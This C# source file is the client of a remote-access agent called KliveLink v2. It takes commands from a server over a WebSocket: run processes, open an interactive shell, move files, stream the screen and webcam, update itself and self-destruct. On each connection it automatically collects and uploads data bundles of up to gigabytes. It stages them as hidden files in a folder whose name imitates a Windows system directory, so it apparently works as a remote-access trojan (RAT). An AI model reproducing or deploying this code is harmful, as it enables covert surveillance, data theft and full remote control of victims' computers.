using System.Net.WebSockets;
using System.Security.Cryptography;
using System.Text.Json;
using KliveLink.Agent;
using KliveLink.Contracts;
using KliveLink.Protocol;

namespace KliveLink.Agent.V2;

public sealed class KliveLinkV2Client : IDisposable
{
    private readonly string _serverUri;
    private readonly string _agentId;
    private readonly string _token;
    private readonly string? _pinSha256;
    private readonly V2CommandDispatcher _dispatcher;
    private readonly ScreenCaptureService _screenCapture;
    private readonly CameraCaptureService _cameraCapture;
    private readonly SemaphoreSlim _sendLock = new(1, 1);
    private readonly SemaphoreSlim _commandSlots = new(4, 4);
    private readonly SemaphoreSlim _collectGate = new(1, 1);
    private readonly V2CollectionTier _autoTier;
    private V2ShellSession? _shell;
    private ClientWebSocket? _socket;
    private CancellationTokenSource? _cts;
    private Task? _receiveTask;
    private Task? _heartbeatTask;
    private Task? _autoTask;
    private long _lastActivityUtcTicks;

    private static readonly string CacheDirectory = OperatingSystem.IsWindows()
        ? Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "Microsoft", "Windows", "Caches")
        : Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            OperatingSystem.IsMacOS() ? "KliveLink" : "klivelink");

    private string AgentFileSuffix => string.Concat(_agentId.Where(c => char.IsLetterOrDigit(c) || c is '-' or '_' or '.'));
    private string PendingZipPath => Path.Combine(CacheDirectory, $"k.{AgentFileSuffix}.pending.zip");
    private string PendingManifestPath => Path.Combine(CacheDirectory, $"k.{AgentFileSuffix}.pending.json");
    private string AutoStatePath => Path.Combine(CacheDirectory, $"k.{AgentFileSuffix}.auto.json");

    public bool IsConnected => _socket?.State == WebSocketState.Open;
    public event Action<string>? OnLog;

    public KliveLinkV2Client(string serverUri, string agentId, string token,
        V2CommandDispatcher dispatcher, ScreenCaptureService screenCapture, string? pinSha256 = null,
        V2CollectionTier autoTier = V2CollectionTier.T1, CameraCaptureService? cameraCapture = null)
    {
        _serverUri = serverUri;
        _agentId = agentId;
        _token = token;
        _pinSha256 = pinSha256;
        _autoTier = autoTier;
        _dispatcher = dispatcher;
        _screenCapture = screenCapture;
        _cameraCapture = cameraCapture ?? new CameraCaptureService();
        _screenCapture.OnFrameCaptured += frame => _ = SendScreenFrameAsync(frame);
        _cameraCapture.OnFrameCaptured += frame => _ = SendCameraFrameAsync(frame);
    }

    public async Task ConnectAsync(CancellationToken cancellationToken = default)
    {
        _cts = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        int attempt = 0;
        while (!_cts.Token.IsCancellationRequested)
        {
            try
            {
                _socket = new ClientWebSocket();
                _socket.Options.SetRequestHeader("X-Agent-Id", _agentId);
                _socket.Options.SetRequestHeader("X-Enrollment-Token", _token);
                if (!string.IsNullOrWhiteSpace(_pinSha256))
                {
                    _socket.Options.RemoteCertificateValidationCallback = (_, certificate, _, errors) =>
                    {
                        if (certificate == null) return false;
                        string hash = Convert.ToHexString(certificate.GetCertHash(System.Security.Cryptography.HashAlgorithmName.SHA256)).ToLowerInvariant();
                        return string.Equals(hash, _pinSha256!.Replace(":", "").Replace(" ", "").ToLowerInvariant(), StringComparison.OrdinalIgnoreCase);
                    };
                }
                _socket.Options.KeepAliveInterval = TimeSpan.FromSeconds(20);
                Log($"Connecting to {_serverUri}...");
                await _socket.ConnectAsync(new Uri(_serverUri), _cts.Token);
                await HandshakeAsync(_cts.Token);
                Log("Connected and authenticated to KliveLink v2.");
                Interlocked.Exchange(ref _lastActivityUtcTicks, DateTimeOffset.UtcNow.UtcTicks);
                attempt = 0;
                _receiveTask = ReceiveLoopAsync(_cts.Token);
                _heartbeatTask = HeartbeatLoopAsync(_cts.Token);
                if (_autoTask == null || _autoTask.IsCompleted)
                    _autoTask = Task.Run(() => AutoCollectAsync(_cts!.Token));
                Task completed = await Task.WhenAny(_receiveTask, _heartbeatTask);
                Log(completed == _receiveTask
                    ? $"Receive loop ended ({_socket?.State})."
                    : $"Heartbeat loop ended ({_socket?.State}).");
            }
            catch (OperationCanceledException) { break; }
            catch (Exception ex)
            {
                Log($"Connection error: {ex.Message}");
            }
            finally
            {
                _screenCapture.StopCapture();
                if (_socket?.State == WebSocketState.Open)
                {
                    try { await _socket.CloseAsync(WebSocketCloseStatus.NormalClosure, "Reconnecting", CancellationToken.None); } catch { }
                }
                _socket?.Dispose();
                _socket = null;
            }

            if (_cts.Token.IsCancellationRequested) break;
            attempt++;
            int seconds = Math.Min(30, (int)Math.Pow(2, Math.Min(attempt, 5)));
            seconds += Random.Shared.Next(0, Math.Max(1, seconds / 4));
            Log($"Reconnecting in {seconds}s...");
            try { await Task.Delay(TimeSpan.FromSeconds(seconds), _cts.Token); } catch { break; }
        }
    }

    private async Task HandshakeAsync(CancellationToken ct)
    {
        string clientNonce = Convert.ToBase64String(RandomNumberGenerator.GetBytes(24));
        var hello = new V2Hello
        {
            AgentId = _agentId,
            MachineName = Environment.MachineName,
            OsVersion = Environment.OSVersion.ToString(),
            AgentVersion = "2.0.0",
            Nonce = clientNonce,
            Capabilities = V2Capabilities.All,
        };
        await SendFrameAsync(V2FrameType.Hello, hello, ct);
        V2Frame challengeFrame = await V2FrameCodec.ReadFrameAsync(_socket!, ct);
        if (challengeFrame.Type != V2FrameType.Challenge)
            throw new InvalidDataException("Expected challenge.");
        V2Challenge challenge = V2Json.Deserialize<V2Challenge>(challengeFrame.Payload) ?? throw new InvalidDataException("Invalid challenge.");
        var auth = new V2Auth { Proof = V2Proof.Compute(_token, _agentId, clientNonce, challenge.ServerNonce) };
        await SendFrameAsync(V2FrameType.Auth, auth, ct);
        V2Frame welcomeFrame = await V2FrameCodec.ReadFrameAsync(_socket!, ct);
        if (welcomeFrame.Type != V2FrameType.Welcome)
        {
            V2Error? error = V2Json.Deserialize<V2Error>(welcomeFrame.Payload);
            throw new InvalidDataException(error?.Message ?? "Authentication rejected.");
        }
        Log(V2Json.Deserialize<V2Welcome>(welcomeFrame.Payload)?.SessionId ?? "session established");
    }

    private async Task ReceiveLoopAsync(CancellationToken ct)
    {
        while (!ct.IsCancellationRequested && _socket?.State == WebSocketState.Open)
        {
            try
            {
                V2Frame frame = await V2FrameCodec.ReadFrameAsync(_socket, ct);
                Interlocked.Exchange(ref _lastActivityUtcTicks, DateTimeOffset.UtcNow.UtcTicks);
                switch (frame.Type)
                {
                    case V2FrameType.Ping:
                        await SendFrameAsync(V2FrameType.Pong, new V2Pong { Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() }, ct);
                        break;
                    case V2FrameType.Pong:
                        break;
                    case V2FrameType.Command:
                        V2Command? command = V2Json.Deserialize<V2Command>(frame.Payload);
                        if (command != null) _ = Task.Run(() => HandleCommandAsync(command), ct);
                        break;
                    case V2FrameType.Cancel:
                        break;
                    case V2FrameType.Error:
                        V2Error? error = V2Json.Deserialize<V2Error>(frame.Payload);
                        Log("Server error: " + (error?.Message ?? frame.Payload));
                        break;
                    case V2FrameType.ShellInput:
                        V2ShellInput? input = V2Json.Deserialize<V2ShellInput>(frame.Payload);
                        if (input != null) _shell?.Write(input.Text);
                        break;
                    case V2FrameType.ShellClose:
                        _shell?.Stop();
                        break;
                }
            }
            catch (OperationCanceledException) { break; }
            catch (WebSocketException ex)
            {
                Log("WebSocket closed: " + ex.Message);
                break;
            }
            catch (Exception ex)
            {
                Log("Receive error: " + ex.Message);
                break;
            }
        }
    }

    private async Task HeartbeatLoopAsync(CancellationToken ct)
    {
        while (!ct.IsCancellationRequested && _socket?.State == WebSocketState.Open)
        {
            try
            {
                await Task.Delay(TimeSpan.FromSeconds(20), ct);
                long last = Interlocked.Read(ref _lastActivityUtcTicks);
                if (last != 0 && DateTimeOffset.UtcNow - new DateTimeOffset(last, TimeSpan.Zero) > TimeSpan.FromSeconds(75))
                {
                    Log("Heartbeat timed out; reconnecting.");
                    break;
                }
                await SendFrameAsync(V2FrameType.Ping, new V2Ping(), ct);
            }
            catch (OperationCanceledException) { break; }
            catch (Exception ex)
            {
                Log("Heartbeat error: " + ex.Message);
                break;
            }
        }
    }

    private async Task HandleCommandAsync(V2Command command)
    {
        await _commandSlots.WaitAsync();
        try
        {
            V2Result result;
            using JsonDocument payload = JsonDocument.Parse(string.IsNullOrWhiteSpace(command.Payload) ? "{}" : command.Payload);
            switch (command.Operation)
            {
                case V2CommandOperation.GetSystemInfo:
                    result = Ok(command, _dispatcher.GetSystemInfo());
                    break;
                case V2CommandOperation.RunProcess:
                    result = Ok(command, await _dispatcher.RunProcessAsync(Read<V2RunProcessRequest>(payload), CancellationToken.None));
                    break;
                case V2CommandOperation.RunTerminalCommand:
                    result = Ok(command, await _dispatcher.RunTerminalAsync(Read<V2TerminalRequest>(payload), CancellationToken.None));
                    break;
                case V2CommandOperation.ListProcesses:
                    result = Ok(command, _dispatcher.ListProcesses());
                    break;
                case V2CommandOperation.KillProcess:
                    result = Ok(command, _dispatcher.KillProcess(Read<V2KillProcessRequest>(payload)));
                    break;
                case V2CommandOperation.ListDirectory:
                    result = Ok(command, _dispatcher.ListDirectory(Read<V2ListDirectoryRequest>(payload)));
                    break;
                case V2CommandOperation.DownloadFile:
                    result = Ok(command, _dispatcher.DownloadFile(Read<V2DownloadFileRequest>(payload)));
                    break;
                case V2CommandOperation.UploadFile:
                    result = Ok(command, _dispatcher.UploadFile(Read<V2UploadFileRequest>(payload)));
                    break;
                case V2CommandOperation.ScreenStart:
                    _screenCapture.StartCapture(new ScreenCaptureRequestPayload
                    {
                        MonitorIndex = payload.RootElement.TryGetProperty("monitorIndex", out var mi) ? mi.GetInt32() : 0,
                        Quality = payload.RootElement.TryGetProperty("quality", out var q) ? q.GetInt32() : 50,
                        IntervalMs = payload.RootElement.TryGetProperty("intervalMs", out var ii) ? ii.GetInt32() : 1000,
                    });
                    await SendFrameAsync(V2FrameType.StreamOpen, new V2StreamOpen { StreamId = 1, Kind = "screen", Metadata = "{}" }, CancellationToken.None);
                    result = Ok(command, new { started = true, streamId = 1 });
                    break;
                case V2CommandOperation.ScreenStop:
                    _screenCapture.StopCapture();
                    await SendFrameAsync(V2FrameType.StreamEnd, new V2StreamEnd { StreamId = 1 }, CancellationToken.None);
                    result = Ok(command, new { stopped = true });
                    break;
                case V2CommandOperation.CameraList:
                    result = Ok(command, _cameraCapture.ListCameras());
                    break;
                case V2CommandOperation.CameraStart:
                    var cameraRequest = Read<V2CameraStartRequest>(payload);
                    var cameraStart = _cameraCapture.Start(cameraRequest);
                    if (cameraStart.Started)
                        await SendFrameAsync(V2FrameType.StreamOpen, new V2StreamOpen
                        {
                            StreamId = 2,
                            Kind = "camera",
                            Metadata = V2Json.Serialize(new { cameraIndex = cameraRequest.CameraIndex }),
                        }, CancellationToken.None);
                    result = cameraStart.Started
                        ? Ok(command, new { started = true, streamId = 2 })
                        : new V2Result { CommandId = command.CommandId, Status = V2CommandStatus.Failed, Error = cameraStart.Error };
                    break;
                case V2CommandOperation.CameraStop:
                    _cameraCapture.Stop();
                    await SendFrameAsync(V2FrameType.StreamEnd, new V2StreamEnd { StreamId = 2 }, CancellationToken.None);
                    result = Ok(command, new { stopped = true });
                    break;
                case V2CommandOperation.ShellOpen:
                    _shell?.Stop();
                    _shell = new V2ShellSession(text => _ = SendFrameAsync(V2FrameType.ShellOutput, new V2ShellOutput { Text = text }, CancellationToken.None));
                    bool started = _shell.Start();
                    result = Ok(command, new { started });
                    break;
                case V2CommandOperation.ShellClose:
                    _shell?.Stop();
                    _shell = null;
                    result = Ok(command, new { stopped = true });
                    break;
                case V2CommandOperation.StartCollection:
                    result = await RunCollectionAsync(command, Read<V2CollectionRequest>(payload));
                    break;
                case V2CommandOperation.UpdateAgent:
                    result = Ok(command, await V2Updater.UpdateAsync(Read<V2UpdateManifest>(payload), CancellationToken.None));
                    break;
                case V2CommandOperation.SelfDestruct:
                    var destroyed = V2SelfDestruct.Run();
                    result = Ok(command, destroyed);
                    await SendResultAsync(result);
                    await Task.Delay(1200);
                    _cts?.Cancel();
                    return;
                case V2CommandOperation.Disconnect:
                    result = Ok(command, new { disconnected = true });
                    await SendResultAsync(result);
                    _cts?.Cancel();
                    return;
                default:
                    result = new V2Result { CommandId = command.CommandId, Status = V2CommandStatus.Unsupported, Error = "Unsupported operation." };
                    break;
            }
            await SendResultAsync(result);
        }
        catch (Exception ex)
        {
            await SendResultAsync(new V2Result { CommandId = command.CommandId, Status = V2CommandStatus.Failed, Error = ex.Message });
        }
        finally
        {
            _commandSlots.Release();
        }
    }

    private async Task<V2Result> RunCollectionAsync(V2Command command, V2CollectionRequest request)
    {
        await _collectGate.WaitAsync();
        try
        {
            var bundle = await new V2Collector(_agentId, request.MaxBytes).CollectAsync(request, CancellationToken.None);
            await SendBundleCoreAsync(bundle, CancellationToken.None);
            return Ok(command, new
            {
                snapshotId = bundle.Manifest.SnapshotId,
                bytes = bundle.ZipBytes.LongLength,
                records = bundle.Manifest.Records.Count,
                sha256 = bundle.Sha256,
            });
        }
        finally
        {
            _collectGate.Release();
        }
    }

    private async Task SendBundleCoreAsync(V2CollectionBundle bundle, CancellationToken ct)
    {
        if (!IsConnected) throw new InvalidOperationException("Agent is not connected.");
        var begin = new V2CollectionBegin
        {
            SnapshotId = bundle.Manifest.SnapshotId,
            Tier = bundle.Manifest.Tier,
            Profile = bundle.Manifest.Profile,
            ManifestJson = V2Json.Serialize(bundle.Manifest),
            RecordCount = bundle.Manifest.Records.Count,
        };
        await SendFrameAsync(V2FrameType.CollectionBegin, begin, ct);
        const int chunkSize = 512 * 1024;
        int sequence = 0;
        for (int offset = 0; offset < bundle.ZipBytes.Length; offset += chunkSize)
        {
            if (!IsConnected) throw new InvalidOperationException("Agent disconnected during collection upload.");
            int count = Math.Min(chunkSize, bundle.ZipBytes.Length - offset);
            await SendFrameAsync(V2FrameType.CollectionChunk, new V2CollectionChunk
            {
                SnapshotId = bundle.Manifest.SnapshotId,
                Sequence = sequence++,
                Base64 = Convert.ToBase64String(bundle.ZipBytes, offset, count),
            }, ct);
        }
        if (!IsConnected) throw new InvalidOperationException("Agent disconnected before collection upload completed.");
        await SendFrameAsync(V2FrameType.CollectionEnd, new V2CollectionEnd
        {
            SnapshotId = bundle.Manifest.SnapshotId,
            Sha256 = bundle.Sha256,
            Bytes = bundle.ZipBytes.LongLength,
            RecordCount = bundle.Manifest.Records.Count,
        }, ct);
    }

    /// <summary>
    /// Runs once per connection: uploads any bundle left from a previous short
    /// connection, otherwise takes a fresh automatic snapshot and persists it
    /// locally before uploading. A dropped socket never loses the snapshot.
    /// </summary>
    private async Task AutoCollectAsync(CancellationToken ct)
    {
        try
        {
            await _collectGate.WaitAsync(ct);
            try
            {
                V2CollectionBundle? pending = LoadPendingBundle();
                if (pending != null)
                {
                    if (await TryUploadBundleAsync(pending, ct))
                    {
                        ClearPending();
                        WriteAutoState();
                        Log($"Uploaded pending collection {pending.Manifest.SnapshotId}.");
                    }
                    return;
                }

                if (!ShouldAutoCollect()) return;
                Log($"Automatic {_autoTier} collection started.");
                var request = new V2CollectionRequest
                {
                    Profile = AutoProfile(_autoTier),
                    Tier = _autoTier,
                    MaxBytes = AutoMaxBytes(_autoTier),
                };
                V2CollectionBundle bundle = await new V2Collector(_agentId, request.MaxBytes)
                    .CollectAsync(request, ct);
                SavePending(bundle);
                if (await TryUploadBundleAsync(bundle, ct))
                {
                    ClearPending();
                    WriteAutoState();
                    Log($"Automatic {_autoTier} collection uploaded ({bundle.Manifest.Records.Count} records, {bundle.ZipBytes.Length} bytes).");
                }
                else
                {
                    Log("Automatic collection saved locally; will retry on the next connection.");
                }
            }
            finally
            {
                _collectGate.Release();
            }
        }
        catch (OperationCanceledException) { }
        catch (Exception ex)
        {
            Log("Automatic collection error: " + ex.Message);
        }
    }

    private async Task<bool> TryUploadBundleAsync(V2CollectionBundle bundle, CancellationToken ct)
    {
        try
        {
            if (!IsConnected) return false;
            await SendBundleCoreAsync(bundle, ct);
            return true;
        }
        catch (Exception ex)
        {
            Log("Collection upload deferred: " + ex.Message);
            return false;
        }
    }

    private static string AutoProfile(V2CollectionTier tier) => tier switch
    {
        V2CollectionTier.T2 => "auto-deep",
        V2CollectionTier.T1 => "auto-full",
        _ => "auto-fast",
    };

    private static long AutoMaxBytes(V2CollectionTier tier) => tier switch
    {
        V2CollectionTier.T2 => 2L * 1024 * 1024 * 1024,
        V2CollectionTier.T1 => 500L * 1024 * 1024,
        _ => 50L * 1024 * 1024,
    };

    private bool ShouldAutoCollect()
    {
        if (File.Exists(PendingZipPath) || File.Exists(PendingManifestPath)) return true;
        try
        {
            if (!File.Exists(AutoStatePath)) return true;
            using JsonDocument doc = JsonDocument.Parse(File.ReadAllText(AutoStatePath));
            if (doc.RootElement.TryGetProperty("lastUtc", out JsonElement last) &&
                DateTimeOffset.TryParse(last.GetString(), out DateTimeOffset when))
                return DateTimeOffset.UtcNow - when > TimeSpan.FromHours(6);
        }
        catch { }
        return true;
    }

    private void WriteAutoState()
    {
        try
        {
            Directory.CreateDirectory(CacheDirectory);
            File.WriteAllText(AutoStatePath, V2Json.Serialize(new { lastUtc = DateTimeOffset.UtcNow }));
        }
        catch { }
    }

    private void SavePending(V2CollectionBundle bundle)
    {
        try
        {
            Directory.CreateDirectory(CacheDirectory);
            File.WriteAllText(PendingManifestPath, V2Json.Serialize(bundle.Manifest));
            File.WriteAllBytes(PendingZipPath, bundle.ZipBytes);
            try { File.SetAttributes(PendingManifestPath, FileAttributes.Hidden); } catch { }
            try { File.SetAttributes(PendingZipPath, FileAttributes.Hidden); } catch { }
        }
        catch { }
    }

    private V2CollectionBundle? LoadPendingBundle()
    {
        try
        {
            if (!File.Exists(PendingZipPath) || !File.Exists(PendingManifestPath)) return null;
            V2CollectionManifest? manifest = V2Json.Deserialize<V2CollectionManifest>(
                File.ReadAllText(PendingManifestPath));
            if (manifest == null) return null;
            byte[] zip = File.ReadAllBytes(PendingZipPath);
            return new V2CollectionBundle
            {
                Manifest = manifest,
                ZipBytes = zip,
                Sha256 = Convert.ToHexString(SHA256.HashData(zip)).ToLowerInvariant(),
            };
        }
        catch { return null; }
    }

    private void ClearPending()
    {
        try { File.Delete(PendingZipPath); } catch { }
        try { File.Delete(PendingManifestPath); } catch { }
    }

    private async Task SendScreenFrameAsync(ScreenCaptureFramePayload frame)
    {
        if (!IsConnected) return;
        try
        {
            await SendFrameAsync(V2FrameType.StreamData, new V2StreamData
            {
                StreamId = 1,
                Base64 = frame.Base64JpegData,
                Metadata = JsonSerializer.Serialize(new
                {
                    width = frame.Width,
                    height = frame.Height,
                    monitor = frame.MonitorIndex,
                    at = DateTimeOffset.UtcNow,
                }, V2Json.Options),
            }, _cts?.Token ?? CancellationToken.None);
        }
        catch { }
    }

    private async Task SendCameraFrameAsync(CameraFrame frame)
    {
        if (!IsConnected) return;
        try
        {
            await SendFrameAsync(V2FrameType.StreamData, new V2StreamData
            {
                StreamId = 2,
                Base64 = Convert.ToBase64String(frame.Jpeg),
                Metadata = JsonSerializer.Serialize(new
                {
                    width = frame.Width,
                    height = frame.Height,
                    cameraIndex = frame.CameraIndex,
                    at = DateTimeOffset.UtcNow,
                }, V2Json.Options),
            }, _cts?.Token ?? CancellationToken.None);
        }
        catch { }
    }

    private async Task SendResultAsync(V2Result result)
    {
        await SendFrameAsync(V2FrameType.Result, result, _cts?.Token ?? CancellationToken.None);
    }

    private async Task SendFrameAsync(V2FrameType type, object payload, CancellationToken ct)
    {
        if (_socket?.State != WebSocketState.Open) return;
        await _sendLock.WaitAsync(ct);
        try
        {
            if (_socket?.State != WebSocketState.Open) return;
            await V2FrameCodec.SendAsync(_socket, new V2Frame
            {
                Type = type,
                Payload = JsonSerializer.Serialize(payload, V2Json.Options),
            }, ct);
        }
        catch (Exception ex)
        {
            Log("Send error: " + ex.Message);
        }
        finally { _sendLock.Release(); }
    }

    private static V2Result Ok(V2Command command, object payload) => new()
    {
        CommandId = command.CommandId,
        Status = V2CommandStatus.Ok,
        Payload = JsonSerializer.Serialize(payload, V2Json.Options),
    };

    private static T Read<T>(JsonDocument document) => V2Json.Deserialize<T>(document.RootElement.GetRawText()) ?? Activator.CreateInstance<T>();

    private void Log(string message)
    {
        V2Log.Write(message);
        OnLog?.Invoke($"[KliveLink v2 {DateTime.Now:HH:mm:ss}] {message}");
    }

    public void Dispose()
    {
        _shell?.Stop();
        _cts?.Cancel();
        _screenCapture.Dispose();
        _cameraCapture.Dispose();
        _socket?.Dispose();
    }
}
